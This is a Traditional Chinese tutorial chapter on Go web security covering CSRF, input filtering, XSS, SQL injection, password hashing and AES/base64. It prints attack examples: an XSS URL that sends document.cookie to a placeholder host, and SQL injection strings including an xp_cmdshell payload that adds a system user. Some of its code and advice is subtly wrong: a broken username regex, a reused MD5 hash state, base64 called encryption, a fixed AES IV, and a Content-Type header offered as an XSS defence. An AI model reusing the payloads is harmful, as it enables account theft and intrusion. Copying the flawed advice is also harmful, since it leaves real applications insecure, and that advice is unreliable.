# 9 安全與加密
無論是開發Web應用的開發者還是企圖利用Web應用漏洞的攻擊者，對於Web程序安全這個話題都給予了越來越多的關注。特別是最近CSDN密碼洩露事件，更是讓我們對Web安全這個話題更加重視，所有人都談密碼色變，都開始檢測自己的系統是否存在漏洞。那麼我們作為一名Go程序的開發者，一定也需要知道我們的應用程序隨時會成為眾多攻擊者的目標，並提前做好防範的準備。

很多Web應用程序中的安全問題都是由於輕信了第三方提供的數據造成的。比如對於用戶的輸入數據，在對其進行驗證之前都應該將其視為不安全的數據。如果直接把這些不安全的數據輸出到客戶端，就可能造成跨站腳本攻擊(XSS)的問題。如果把不安全的數據用於數據庫查詢，那麼就可能造成SQL注入問題，我們將會在9.3、9.4小節介紹如何避免這些問題。

在使用第三方提供的數據，包括用戶提供的數據時，首先檢驗這些數據的合法性非常重要，這個過程叫做過濾，我們將在9.2小節介紹如何保證對所有輸入的數據進行過濾處理。

過濾輸入和轉義輸出並不能解決所有的安全問題，我們將會在9.1講解的CSRF攻擊，會導致受騙者發送攻擊者指定的請求從而造成一些破壞。

與安全加密相關的，能夠增強我們的Web應用程序的強大手段就是加密，CSDN洩密事件就是因為密碼保存的是明文，使得攻擊拿手庫之後就可以直接實施一些破壞行為了。不過，和其他工具一樣，加密手段也必須運用得當。我們將在9.5小節介紹如何存儲密碼，如何讓密碼存儲的安全。

加密的本質就是擾亂數據，某些不可恢復的數據擾亂我們稱為單向加密或者散列算法。另外還有一種雙向加密方式，也就是可以對加密後的數據進行解密。我們將會在9.6小節介紹如何實現這種雙向加密方式。

## 目錄
  ![](images/navi9.png?raw=true)

## links
   * [目錄](<preface.md>)
   * 上一章: [第八章總結](<08.5.md>)
   * 下一節: [預防CSRF攻擊](<09.1.md>)

---

# 9.1 預防CSRF攻擊

## 什麼是CSRF

CSRF（Cross-site request forgery），中文名稱：跨站請求偽造，也被稱為：one click attack/session riding，縮寫為：CSRF/XSRF。

那麼CSRF到底能夠幹嘛呢？你可以這樣簡單的理解：攻擊者可以盜用你的登陸信息，以你的身份模擬發送各種請求。攻擊者只要藉助少許的社會工程學的詭計，例如通過QQ等聊天軟件發送的鏈接(有些還偽裝成短域名，用戶無法分辨)，攻擊者就能迫使Web應用的用戶去執行攻擊者預設的操作。例如，當用戶登錄網絡銀行去查看其存款餘額，在他沒有退出時，就點擊了一個QQ好友發來的鏈接，那麼該用戶銀行帳戶中的資金就有可能被轉移到攻擊者指定的帳戶中。

所以遇到CSRF攻擊時，將對終端用戶的數據和操作指令構成嚴重的威脅；當受攻擊的終端用戶具有管理員帳戶的時候，CSRF攻擊將危及整個Web應用程序。

## CSRF的原理

下圖簡單闡述了CSRF攻擊的思想

![](images/9.1.csrf.png?raw=true)

圖9.1 CSRF的攻擊過程

從上圖可以看出，要完成一次CSRF攻擊，受害者必須依次完成兩個步驟 ：

- 1.登錄受信任網站A，並在本地生成Cookie 。
- 2.在不退出A的情況下，訪問危險網站B。

看到這裡，讀者也許會問：“如果我不滿足以上兩個條件中的任意一個，就不會受到CSRF的攻擊”。是的，確實如此，但你不能保證以下情況不會發生：

- 你不能保證你登錄了一個網站後，不再打開一個tab頁面並訪問另外的網站，特別現在瀏覽器都是支持多tab的。
- 你不能保證你關閉瀏覽器了後，你本地的Cookie立刻過期，你上次的會話已經結束。
- 上圖中所謂的攻擊網站，可能是一個存在其他漏洞的可信任的經常被人訪問的網站。

因此對於用戶來說很難避免在登陸一個網站之後不點擊一些鏈接進行其他操作，所以隨時可能成為CSRF的受害者。

CSRF攻擊主要是因為Web的隱式身份驗證機制，Web的身份驗證機制雖然可以保證一個請求是來自於某個用戶的瀏覽器，但卻無法保證該請求是用戶批准發送的。

## 如何預防CSRF
過上面的介紹，讀者是否覺得這種攻擊很恐怖，意識到恐怖是個好事情，這樣會促使你接著往下看如何改進和防止類似的漏洞出現。

CSRF的防禦可以從服務端和客戶端兩方面著手，防禦效果是從服務端著手效果比較好，現在一般的CSRF防禦也都在服務端進行。

服務端的預防CSRF攻擊的方式方法有多種，但思想上都是差不多的，主要從以下2個方面入手：

- 1、正確使用GET,POST和Cookie；
- 2、在非GET請求中增加偽隨機數；

我們上一章介紹過REST方式的Web應用，一般而言，普通的Web應用都是以GET、POST為主，還有一種請求是Cookie方式。我們一般都是按照如下方式設計應用：

1、GET常用在查看，列舉，展示等不需要改變資源屬性的時候；

2、POST常用在下達訂單，改變一個資源的屬性或者做其他一些事情；

接下來我就以Go語言來舉例說明，如何限制對資源的訪問方法：

	mux.Get("/user/:uid", getuser)
	mux.Post("/user/:uid", modifyuser)

這樣處理後，因為我們限定了修改只能使用POST，當GET方式請求時就拒絕響應，所以上面圖示中GET方式的CSRF攻擊就可以防止了，但這樣就能全部解決問題了嗎？當然不是，因為POST也是可以模擬的。

因此我們需要實施第二步，在非GET方式的請求中增加隨機數，這個大概有三種方式來進行：

- 為每個用戶生成一個唯一的cookie token，所有表單都包含同一個偽隨機值，這種方案最簡單，因為攻擊者不能獲得第三方的Cookie(理論上)，所以表單中的數據也就構造失敗，但是由於用戶的Cookie很容易由於網站的XSS漏洞而被盜取，所以這個方案必須要在沒有XSS的情況下才安全。
- 每個請求使用驗證碼，這個方案是完美的，因為要多次輸入驗證碼，所以用戶友好性很差，所以不適合實際運用。
- 不同的表單包含一個不同的偽隨機值，我們在4.4小節介紹“如何防止表單多次遞交”時介紹過此方案，複用相關代碼，實現如下：

生成隨機數token

	h := md5.New()
	io.WriteString(h, strconv.FormatInt(crutime, 10))
	io.WriteString(h, "ganraomaxxxxxxxxx")
	token := fmt.Sprintf("%x", h.Sum(nil))

	t, _ := template.ParseFiles("login.gtpl")
	t.Execute(w, token)

輸出token

	<input type="hidden" name="token" value="{{.}}">

驗證token

	r.ParseForm()
	token := r.Form.Get("token")
	if token != "" {
		//驗證token的合法性
	} else {
		//不存在token報錯
	}

這樣基本就實現了安全的POST，但是也許你會說如果破解了token的算法呢，按照理論上是，但是實際上破解是基本不可能的，因為有人曾計算過，暴力破解該串大概需要2的11次方時間。

## 總結
跨站請求偽造，即CSRF，是一種非常危險的Web安全威脅，它被Web安全界稱為“沉睡的巨人”，其威脅程度由此“美譽”便可見一斑。本小節不僅對跨站請求偽造本身進行了簡單介紹，還詳細說明造成這種漏洞的原因所在，然後以此提了一些防範該攻擊的建議，希望對讀者編寫安全的Web應用能夠有所啟發。

## links
   * [目錄](<preface.md>)
   * 上一節: [安全與加密](<09.0.md>)
   * 下一節: [確保輸入過濾](<09.2.md>)

---

# 9.2 確保輸入過濾
過濾用戶數據是Web應用安全的基礎。它是驗證數據合法性的過程。通過對所有的輸入數據進行過濾，可以避免惡意數據在程序中被誤信或誤用。大多數Web應用的漏洞都是因為沒有對用戶輸入的數據進行恰當過濾所引起的。

我們介紹的過濾數據分成三個步驟：

- 1、識別數據，搞清楚需要過濾的數據來自於哪裡
- 2、過濾數據，弄明白我們需要什麼樣的數據
- 3、區分已過濾及被汙染數據，如果存在攻擊數據那麼保證過濾之後可以讓我們使用更安全的數據

## 識別數據
“識別數據”作為第一步是因為在你不知道“數據是什麼，它來自於哪裡”的前提下，你也就不能正確地過濾它。這裡的數據是指所有源自非代碼內部提供的數據。例如:所有來自客戶端的數據，但客戶端並不是唯一的外部數據源，數據庫和第三方提供的接口數據等也可以是外部數據源。

由用戶輸入的數據我們通過Go非常容易識別，Go通過`r.ParseForm`之後，把用戶POST和GET的數據全部放在了`r.Form`裡面。其它的輸入要難識別得多，例如，`r.Header`中的很多元素是由客戶端所操縱的。常常很難確認其中的哪些元素組成了輸入，所以，最好的方法是把裡面所有的數據都看成是用戶輸入。(例如`r.Header.Get("Accept-Charset")`這樣的也看做是用戶輸入,雖然這些大多數是瀏覽器操縱的)

## 過濾數據
在知道數據來源之後，就可以過濾它了。過濾是一個有點正式的術語，它在平時表述中有很多同義詞，如驗證、清潔及淨化。儘管這些術語表面意義不同，但它們都是指的同一個處理：防止非法數據進入你的應用。

過濾數據有很多種方法，其中有一些安全性較差。最好的方法是把過濾看成是一個檢查的過程，在你使用數據之前都檢查一下看它們是否是符合合法數據的要求。而且不要試圖好心地去糾正非法數據，而要讓用戶按你制定的規則去輸入數據。歷史證明了試圖糾正非法數據往往會導致安全漏洞。這裡舉個例子：“最近建設銀行系統升級之後，如果密碼後面兩位是0，只要輸入前面四位就能登錄系統”，這是一個非常嚴重的漏洞。

過濾數據主要採用如下一些庫來操作：

- strconv包下面的字符串轉化相關函數，因為從Request中的`r.Form`返回的是字符串，而有些時候我們需要將之轉化成整/浮點數，`Atoi`、`ParseBool`、`ParseFloat`、`ParseInt`等函數就可以派上用場了。
- string包下面的一些過濾函數`Trim`、`ToLower`、`ToTitle`等函數，能夠幫助我們按照指定的格式獲取信息。
- regexp包用來處理一些複雜的需求，例如判定輸入是否是Email、生日之類。

過濾數據除了檢查驗證之外，在特殊時候，還可以採用白名單。即假定你正在檢查的數據都是非法的，除非能證明它是合法的。使用這個方法，如果出現錯誤，只會導致把合法的數據當成是非法的，而不會是相反，儘管我們不想犯任何錯誤，但這樣總比把非法數據當成合法數據要安全得多。

## 區分過濾數據
如果完成了上面的兩步，數據過濾的工作就基本完成了，但是在編寫Web應用的時候我們還需要區分已過濾和被汙染數據，因為這樣可以保證過濾數據的完整性，而不影響輸入的數據。我們約定把所有經過過濾的數據放入一個叫全局的Map變量中(CleanMap)。這時需要用兩個重要的步驟來防止被汙染數據的注入：
- 每個請求都要初始化CleanMap為一個空Map。
- 加入檢查及阻止來自外部數據源的變量命名為CleanMap。

接下來，讓我們通過一個例子來鞏固這些概念，請看下面這個表單

	<form action="/whoami" method="POST">
		我是誰:
		<select name="name">
			<option value="astaxie">astaxie</option>
			<option value="herry">herry</option>
			<option value="marry">marry</option>
		</select>
		<input type="submit" />
	</form>

在處理這個表單的編程邏輯中，非常容易犯的錯誤是認為只能提交三個選擇中的一個。其實攻擊者可以模擬POST操作，遞交`name=attack`這樣的數據，所以在此時我們需要做類似白名單的處理

	r.ParseForm()
	name := r.Form.Get("name")
	CleanMap := make(map[string]interface{}, 0)
	if name == "astaxie" || name == "herry" || name == "marry" {
		CleanMap["name"] = name
	}

上面代碼中我們初始化了一個CleanMap的變量，當判斷獲取的name是`astaxie`、`herry`、`marry`三個中的一個之後
，我們把數據存儲到了CleanMap之中，這樣就可以確保CleanMap["name"]中的數據是合法的，從而在代碼的其它部分使用它。當然我們還可以在else部分增加非法數據的處理，一種可能是再次顯示錶單並提示錯誤。但是不要試圖為了友好而輸出被汙染的數據。

上面的方法對於過濾一組已知的合法值的數據很有效，但是對於過濾有一組已知合法字符組成的數據時就沒有什麼幫助。例如，你可能需要一個用戶名只能由字母及數字組成：

	r.ParseForm()
	username := r.Form.Get("username")
	CleanMap := make(map[string]interface{}, 0)
	if ok, _ := regexp.MatchString("^[a-zA-Z0-9].$", username); ok {
		CleanMap["username"] = username
	}

## 總結
數據過濾在Web安全中起到一個基石的作用，大多數的安全問題都是由於沒有過濾數據和驗證數據引起的，例如前面小節的CSRF攻擊，以及接下來將要介紹的XSS攻擊、SQL注入等都是沒有認真地過濾數據引起的，因此我們需要特別重視這部分的內容。

## links
   * [目錄](<preface.md>)
   * 上一節: [預防CSRF攻擊](<09.1.md>)
   * 下一節: [避免XSS攻擊](<09.3.md>)

---

# 9.3 避免XSS攻擊
隨著互聯網技術的發展，現在的Web應用都含有大量的動態內容以提高用戶體驗。所謂動態內容，就是應用程序能夠根據用戶環境和用戶請求，輸出相應的內容。動態站點會受到一種名為“跨站腳本攻擊”（Cross Site Scripting, 安全專家們通常將其縮寫成 XSS）的威脅，而靜態站點則完全不受其影響。

## 什麼是XSS
XSS攻擊：跨站腳本攻擊(Cross-Site Scripting)，為了不和層疊樣式表(Cascading Style Sheets, CSS)的縮寫混淆，故將跨站腳本攻擊縮寫為XSS。XSS是一種常見的web安全漏洞，它允許攻擊者將惡意代碼植入到提供給其它用戶使用的頁面中。不同於大多數攻擊(一般只涉及攻擊者和受害者)，XSS涉及到三方，即攻擊者、客戶端與Web應用。XSS的攻擊目標是為了盜取存儲在客戶端的cookie或者其他網站用於識別客戶端身份的敏感信息。一旦獲取到合法用戶的信息後，攻擊者甚至可以假冒合法用戶與網站進行交互。

XSS通常可以分為兩大類：一類是存儲型XSS，主要出現在讓用戶輸入數據，供其他瀏覽此頁的用戶進行查看的地方，包括留言、評論、博客日誌和各類表單等。應用程序從數據庫中查詢數據，在頁面中顯示出來，攻擊者在相關頁面輸入惡意的腳本數據後，用戶瀏覽此類頁面時就可能受到攻擊。這個流程簡單可以描述為:惡意用戶的Html輸入Web程序->進入數據庫->Web程序->用戶瀏覽器。另一類是反射型XSS，主要做法是將腳本代碼加入URL地址的請求參數裡，請求參數進入程序後在頁面直接輸出，用戶點擊類似的惡意鏈接就可能受到攻擊。

XSS目前主要的手段和目的如下：

- 盜用cookie，獲取敏感信息。
- 利用植入Flash，通過crossdomain權限設置進一步獲取更高權限；或者利用Java等得到類似的操作。
- 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻擊者）用戶的身份執行一些管理動作，或執行一些如:發微博、加好友、發私信等常規操作，前段時間新浪微博就遭遇過一次XSS。
- 利用可被攻擊的域受到其他域信任的特點，以受信任來源的身份請求一些平時不允許的操作，如進行不當的投票活動。
- 在訪問量極大的一些頁面上的XSS可以攻擊一些小型網站，實現DDoS攻擊的效果

## XSS的原理
Web應用未對用戶提交請求的數據做充分的檢查過濾，允許用戶在提交的數據中摻入HTML代碼(最主要的是“>”、“<”)，並將未經轉義的惡意代碼輸出到第三方用戶的瀏覽器解釋執行，是導致XSS漏洞的產生原因。

接下來以反射性XSS舉例說明XSS的過程：現在有一個網站，根據參數輸出用戶的名稱，例如訪問url：`http://127.0.0.1/?name=astaxie`，就會在瀏覽器輸出如下信息：

	hello astaxie

如果我們傳遞這樣的url：`http://127.0.0.1/?name=&#60;script&#62;alert(&#39;astaxie,xss&#39;)&#60;/script&#62;`,這時你就會發現瀏覽器跳出一個彈出框，這說明站點已經存在了XSS漏洞。那麼惡意用戶是如何盜取Cookie的呢？與上類似，如下這樣的url：`http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;`，這樣就可以把當前的cookie發送到指定的站點：www.xxx.com。你也許會說，這樣的URL一看就有問題，怎麼會有人點擊？，是的，這類的URL會讓人懷疑，但如果使用短網址服務將之縮短，你還看得出來麼？攻擊者將縮短過後的url通過某些途徑傳播開來，不明真相的用戶一旦點擊了這樣的url，相應cookie數據就會被髮送事先設定好的站點，這樣子就盜得了用戶的cookie信息，然後就可以利用Websleuth之類的工具來檢查是否能盜取那個用戶的賬戶。

更加詳細的關於XSS的分析大家可以參考這篇叫做《[新浪微博XSS事件分析](http://www.rising.com.cn/newsletter/news/2011-08-18/9621.html)》的文章。

## 如何預防XSS
答案很簡單，堅決不要相信用戶的任何輸入，並過濾掉輸入中的所有特殊字符。這樣就能消滅絕大部分的XSS攻擊。

目前防禦XSS主要有如下幾種方式：

- 過濾特殊字符

	避免XSS的方法之一主要是將用戶所提供的內容進行過濾，Go語言提供了HTML的過濾函數：

	text/template包下面的HTMLEscapeString、JSEscapeString等函數

- 使用HTTP頭指定類型

	`w.Header().Set("Content-Type","text/javascript")`

	這樣就可以讓瀏覽器解析javascript代碼，而不會是html輸出。


## 總結
XSS漏洞是相當有危害的，在開發Web應用的時候，一定要記住過濾數據，特別是在輸出到客戶端之前，這是現在行之有效的防止XSS的手段。

## links
   * [目錄](<preface.md>)
   * 上一節: [確保輸入過濾](<09.2.md>)
   * 下一節: [避免SQL注入](<09.4.md>)

---

# 9.4 避免SQL注入
## 什麼是SQL注入
SQL注入攻擊（SQL Injection），簡稱注入攻擊，是Web開發中最常見的一種安全漏洞。可以用它來從數據庫獲取敏感信息，或者利用數據庫的特性執行添加用戶，導出文件等一系列惡意操作，甚至有可能獲取數據庫乃至系統用戶最高權限。

而造成SQL注入的原因是因為程序沒有有效過濾用戶的輸入，使攻擊者成功的向服務器提交惡意的SQL查詢代碼，程序在接收後錯誤的將攻擊者的輸入作為查詢語句的一部分執行，導致原始的查詢邏輯被改變，額外的執行了攻擊者精心構造的惡意代碼。
## SQL注入實例
很多Web開發者沒有意識到SQL查詢是可以被篡改的，從而把SQL查詢當作可信任的命令。殊不知，SQL查詢是可以繞開訪問控制，從而繞過身份驗證和權限檢查的。更有甚者，有可能通過SQL查詢去運行主機系統級的命令。

下面將通過一些真實的例子來詳細講解SQL注入的方式。

考慮以下簡單的登錄表單：

	<form action="/login" method="POST">
	<p>Username: <input type="text" name="username" /></p>
	<p>Password: <input type="password" name="password" /></p>
	<p><input type="submit" value="登陸" /></p>
	</form>

我們的處理裡面的SQL可能是這樣的：

	username:=r.Form.Get("username")
	password:=r.Form.Get("password")
	sql:="SELECT * FROM user WHERE username='"+username+"' AND password='"+password+"'"

如果用戶的輸入的用戶名如下，密碼任意

	myuser' or 'foo' = 'foo' --

那麼我們的SQL變成了如下所示：

	SELECT * FROM user WHERE username='myuser' or 'foo'=='foo' --'' AND password='xxx'

在SQL裡面`--`是註釋標記，所以查詢語句會在此中斷。這就讓攻擊者在不知道任何合法用戶名和密碼的情況下成功登錄了。

對於MSSQL還有更加危險的一種SQL注入，就是控制系統，下面這個可怕的例子將演示如何在某些版本的MSSQL數據庫上執行系統命令。

	sql:="SELECT * FROM products WHERE name LIKE '%"+prod+"%'"
	Db.Exec(sql)

如果攻擊提交`a%' exec master..xp_cmdshell 'net user test testpass /ADD' --`作為變量 prod的值，那麼sql將會變成

	sql:="SELECT * FROM products WHERE name LIKE '%a%' exec master..xp_cmdshell 'net user test testpass /ADD'--%'"

MSSQL服務器會執行這條SQL語句，包括它後面那個用於向系統添加新用戶的命令。如果這個程序是以sa運行而 MSSQLSERVER服務又有足夠的權限的話，攻擊者就可以獲得一個系統帳號來訪問主機了。

>雖然以上的例子是針對某一特定的數據庫系統的，但是這並不代表不能對其它數據庫系統實施類似的攻擊。針對這種安全漏洞，只要使用不同方法，各種數據庫都有可能遭殃。


## 如何預防SQL注入
也許你會說攻擊者要知道數據庫結構的信息才能實施SQL注入攻擊。確實如此，但沒人能保證攻擊者一定拿不到這些信息，一旦他們拿到了，數據庫就存在洩露的危險。如果你在用開放源代碼的軟件包來訪問數據庫，比如論壇程序，攻擊者就很容易得到相關的代碼。如果這些代碼設計不良的話，風險就更大了。目前Discuz、phpwind、phpcms等這些流行的開源程序都有被SQL注入攻擊的先例。

這些攻擊總是發生在安全性不高的代碼上。所以，永遠不要信任外界輸入的數據，特別是來自於用戶的數據，包括選擇框、表單隱藏域和 cookie。就如上面的第一個例子那樣，就算是正常的查詢也有可能造成災難。

SQL注入攻擊的危害這麼大，那麼該如何來防治呢?下面這些建議或許對防治SQL注入有一定的幫助。

1. 嚴格限制Web應用的數據庫的操作權限，給此用戶提供僅僅能夠滿足其工作的最低權限，從而最大限度的減少注入攻擊對數據庫的危害。
2. 檢查輸入的數據是否具有所期望的數據格式，嚴格限制變量的類型，例如使用regexp包進行一些匹配處理，或者使用strconv包對字符串轉化成其他基本類型的數據進行判斷。
3. 對進入數據庫的特殊字符（'"\尖括號&*;等）進行轉義處理，或編碼轉換。Go 的`text/template`包裡面的`HTMLEscapeString`函數可以對字符串進行轉義處理。
4. 所有的查詢語句建議使用數據庫提供的參數化查詢接口，參數化的語句使用參數而不是將用戶輸入變量嵌入到SQL語句中，即不要直接拼接SQL語句。例如使用`database/sql`裡面的查詢函數`Prepare`和`Query`，或者`Exec(query string, args ...interface{})`。
5. 在應用發佈之前建議使用專業的SQL注入檢測工具進行檢測，以及時修補被發現的SQL注入漏洞。網上有很多這方面的開源工具，例如sqlmap、SQLninja等。
6. 避免網站打印出SQL錯誤信息，比如類型錯誤、字段不匹配等，把代碼裡的SQL語句暴露出來，以防止攻擊者利用這些錯誤信息進行SQL注入。

## 總結
通過上面的示例我們可以知道，SQL注入是危害相當大的安全漏洞。所以對於我們平常編寫的Web應用，應該對於每一個小細節都要非常重視，細節決定命運，生活如此，編寫Web應用也是這樣。

## links
   * [目錄](<preface.md>)
   * 上一節: [避免XSS攻擊](<09.3.md>)
   * 下一節: [存儲密碼](<09.5.md>)

---

# 9.5 存儲密碼
過去一段時間以來, 許多的網站遭遇用戶密碼數據洩露事件, 這其中包括頂級的互聯網企業–Linkedin, 國內諸如CSDN，該事件橫掃整個國內互聯網，隨後又爆出多玩遊戲800萬用戶資料被洩露，另有傳言人人網、開心網、天涯社區、世紀佳緣、百合網等社區都有可能成為黑客下一個目標。層出不窮的類似事件給用戶的網上生活造成巨大的影響，人人自危，因為人們往往習慣在不同網站使用相同的密碼，所以一家“暴庫”，全部遭殃。

那麼我們作為一個Web應用開發者，在選擇密碼存儲方案時, 容易掉入哪些陷阱, 以及如何避免這些陷阱?

## 普通方案
目前用的最多的密碼存儲方案是將明文密碼做單向哈希後存儲，單向哈希算法有一個特徵：無法通過哈希後的摘要(digest)恢復原始數據，這也是“單向”二字的來源。常用的單向哈希算法包括SHA-256, SHA-1, MD5等。

Go語言對這三種加密算法的實現如下所示：

	//import "crypto/sha256"
	h := sha256.New()
	io.WriteString(h, "His money is twice tainted: 'taint yours and 'taint mine.")
	fmt.Printf("% x", h.Sum(nil))

	//import "crypto/sha1"
	h := sha1.New()
	io.WriteString(h, "His money is twice tainted: 'taint yours and 'taint mine.")
	fmt.Printf("% x", h.Sum(nil))

	//import "crypto/md5"
	h := md5.New()
	io.WriteString(h, "需要加密的密碼")
	fmt.Printf("%x", h.Sum(nil))

單向哈希有兩個特性：

- 1）同一個密碼進行單向哈希，得到的總是唯一確定的摘要。
- 2）計算速度快。隨著技術進步，一秒鐘能夠完成數十億次單向哈希計算。

結合上面兩個特點，考慮到多數人所使用的密碼為常見的組合，攻擊者可以將所有密碼的常見組合進行單向哈希，得到一個摘要組合, 然後與數據庫中的摘要進行比對即可獲得對應的密碼。這個摘要組合也被稱為`rainbow table`。

因此通過單向加密之後存儲的數據，和明文存儲沒有多大區別。因此，一旦網站的數據庫洩露，所有用戶的密碼本身就大白於天下。
## 進階方案
通過上面介紹我們知道黑客可以用`rainbow table`來破解哈希後的密碼，很大程度上是因為加密時使用的哈希算法是公開的。如果黑客不知道加密的哈希算法是什麼，那他也就無從下手了。

一個直接的解決辦法是，自己設計一個哈希算法。然而，一個好的哈希算法是很難設計的——既要避免碰撞，又不能有明顯的規律，做到這兩點要比想象中的要困難很多。因此實際應用中更多的是利用已有的哈希算法進行多次哈希。

但是單純的多次哈希，依然阻擋不住黑客。兩次 MD5、三次 MD5之類的方法，我們能想到，黑客自然也能想到。特別是對於一些開源代碼，這樣哈希更是相當於直接把算法告訴了黑客。

沒有攻不破的盾，但也沒有折不斷的矛。現在安全性比較好的網站，都會用一種叫做“加鹽”的方式來存儲密碼，也就是常說的 “salt”。他們通常的做法是，先將用戶輸入的密碼進行一次MD5（或其它哈希算法）加密；將得到的 MD5 值前後加上一些只有管理員自己知道的隨機串，再進行一次MD5加密。這個隨機串中可以包括某些固定的串，也可以包括用戶名（用來保證每個用戶加密使用的密鑰都不一樣）。

	//import "crypto/md5"
	//假設用戶名abc，密碼123456
	h := md5.New()
	io.WriteString(h, "需要加密的密碼")

	//pwmd5等於e10adc3949ba59abbe56e057f20f883e
	pwmd5 :=fmt.Sprintf("%x", h.Sum(nil))

	//指定兩個 salt： salt1 = @#$%   salt2 = ^&*()
	salt1 := "@#$%"
	salt2 := "^&*()"

	//salt1+用戶名+salt2+MD5拼接
	io.WriteString(h, salt1)
	io.WriteString(h, "abc")
	io.WriteString(h, salt2)
	io.WriteString(h, pwmd5)

	last :=fmt.Sprintf("%x", h.Sum(nil))

在兩個salt沒有洩露的情況下，黑客如果拿到的是最後這個加密串，就幾乎不可能推算出原始的密碼是什麼了。

## 專家方案
上面的進階方案在幾年前也許是足夠安全的方案，因為攻擊者沒有足夠的資源建立這麼多的`rainbow table`。 但是，時至今日，因為並行計算能力的提升，這種攻擊已經完全可行。

怎麼解決這個問題呢？只要時間與資源允許，沒有破譯不了的密碼，所以方案是:故意增加密碼計算所需耗費的資源和時間，使得任何人都不可獲得足夠的資源建立所需的`rainbow table`。

這類方案有一個特點，算法中都有個因子，用於指明計算密碼摘要所需要的資源和時間，也就是計算強度。計算強度越大，攻擊者建立`rainbow table`越困難，以至於不可繼續。

這裡推薦`scrypt`方案，scrypt是由著名的FreeBSD黑客Colin Percival為他的備份服務Tarsnap開發的。

目前Go語言裡面支持的庫http://code.google.com/p/go/source/browse?repo=crypto#hg%2Fscrypt

	dk := scrypt.Key([]byte("some password"), []byte(salt), 16384, 8, 1, 32)

通過上面的的方法可以獲取唯一的相應的密碼值，這是目前為止最難破解的。

## 總結
看到這裡，如果你產生了危機感，那麼就行動起來：

- 1）如果你是普通用戶，那麼我們建議使用LastPass進行密碼存儲和生成，對不同的網站使用不同的密碼；
- 2）如果你是開發人員， 那麼我們強烈建議你採用專家方案進行密碼存儲。

## links
   * [目錄](<preface.md>)
   * 上一節: [確保輸入過濾](<09.4.md>)
   * 下一節: [加密和解密數據](<09.6.md>)

---

# 9.6 加密和解密數據
前面小節介紹瞭如何存儲密碼，但是有的時候，我們想把一些敏感數據加密後存儲起來，在將來的某個時候，隨需將它們解密出來，此時我們應該在選用對稱加密算法來滿足我們的需求。

## base64加解密
如果Web應用足夠簡單，數據的安全性沒有那麼嚴格的要求，那麼可以採用一種比較簡單的加解密方法是`base64`，這種方式實現起來比較簡單，Go語言的`base64`包已經很好的支持了這個，請看下面的例子：

	package main

	import (
		"encoding/base64"
		"fmt"
	)

	func base64Encode(src []byte) []byte {
		return []byte(base64.StdEncoding.EncodeToString(src))
	}

	func base64Decode(src []byte) ([]byte, error) {
		return base64.StdEncoding.DecodeString(string(src))
	}

	func main() {
		// encode
		hello := "你好，世界！ hello world"
		debyte := base64Encode([]byte(hello))
		fmt.Println(debyte)
		// decode
		enbyte, err := base64Decode(debyte)
		if err != nil {
			fmt.Println(err.Error())
		}

		if hello != string(enbyte) {
			fmt.Println("hello is not equal to enbyte")
		}

		fmt.Println(string(enbyte))
	}


## 高級加解密

Go語言的`crypto`裡面支持對稱加密的高級加解密包有：

- `crypto/aes`包：AES(Advanced Encryption Standard)，又稱Rijndael加密法，是美國聯邦政府採用的一種區塊加密標準。
- `crypto/des`包：DES(Data Encryption Standard)，是一種對稱加密標準，是目前使用最廣泛的密鑰系統，特別是在保護金融數據的安全中。曾是美國聯邦政府的加密標準，但現已被AES所替代。

因為這兩種算法使用方法類似，所以在此，我們僅用aes包為例來講解它們的使用，請看下面的例子

	package main

	import (
		"crypto/aes"
		"crypto/cipher"
		"fmt"
		"os"
	)

	var commonIV = []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f}

	func main() {
		//需要去加密的字符串
		plaintext := []byte("My name is Astaxie")
		//如果傳入加密串的話，plaint就是傳入的字符串
		if len(os.Args) > 1 {
			plaintext = []byte(os.Args[1])
		}

		//aes的加密字符串
		key_text := "astaxie12798akljzmknm.ahkjkljl;k"
		if len(os.Args) > 2 {
			key_text = os.Args[2]
		}

		fmt.Println(len(key_text))

		// 創建加密算法aes
		c, err := aes.NewCipher([]byte(key_text))
		if err != nil {
			fmt.Printf("Error: NewCipher(%d bytes) = %s", len(key_text), err)
			os.Exit(-1)
		}

		//加密字符串
		cfb := cipher.NewCFBEncrypter(c, commonIV)
		ciphertext := make([]byte, len(plaintext))
		cfb.XORKeyStream(ciphertext, plaintext)
		fmt.Printf("%s=>%x\n", plaintext, ciphertext)

		// 解密字符串
		cfbdec := cipher.NewCFBDecrypter(c, commonIV)
		plaintextCopy := make([]byte, len(plaintext))
		cfbdec.XORKeyStream(plaintextCopy, ciphertext)
		fmt.Printf("%x=>%s\n", ciphertext, plaintextCopy)
	}


上面通過調用函數`aes.NewCipher`(參數key必須是16、24或者32位的[]byte，分別對應AES-128, AES-192或AES-256算法),返回了一個`cipher.Block`接口，這個接口實現了三個功能：

	type Block interface {
		// BlockSize returns the cipher's block size.
		BlockSize() int

		// Encrypt encrypts the first block in src into dst.
		// Dst and src may point at the same memory.
		Encrypt(dst, src []byte)

		// Decrypt decrypts the first block in src into dst.
		// Dst and src may point at the same memory.
		Decrypt(dst, src []byte)
	}

這三個函數實現了加解密操作，詳細的操作請看上面的例子。

## 總結
這小節介紹了幾種加解密的算法，在開發Web應用的時候可以根據需求採用不同的方式進行加解密，一般的應用可以採用base64算法，更加高級的話可以採用aes或者des算法。


## links
   * [目錄](<preface.md>)
   * 上一節: [存儲密碼](<09.5.md>)
   * 下一節: [小結](<09.7.md>)

---

# 9.7 小結
這一章主要介紹瞭如：CSRF攻擊、XSS攻擊、SQL注入攻擊等一些Web應用中典型的攻擊手法，它們都是由於應用對用戶的輸入沒有很好的過濾引起的，所以除了介紹攻擊的方法外，我們也介紹了了如何有效的進行數據過濾，以防止這些攻擊的發生的方法。然後針對日異嚴重的密碼洩漏事件，介紹了在設計Web應用中可採用的從基本到專家的加密方案。最後針對敏感數據的加解密簡要介紹了，Go語言提供三種對稱加密算法：base64、aes和des的實現。

編寫這一章的目的是希望讀者能夠在意識裡面加強安全概念，在編寫Web應用的時候多留心一點，以使我們編寫的Web應用能遠離黑客們的攻擊。Go語言在支持防攻擊方面已經提供大量的工具包，我們可以充分的利用這些包來做出一個安全的Web應用。

## links
   * [目錄](<preface.md>)
   * 上一節: [加密和解密數據](<09.6.md>)
   * 下一節: [國際化和本地化](<10.0.md>)
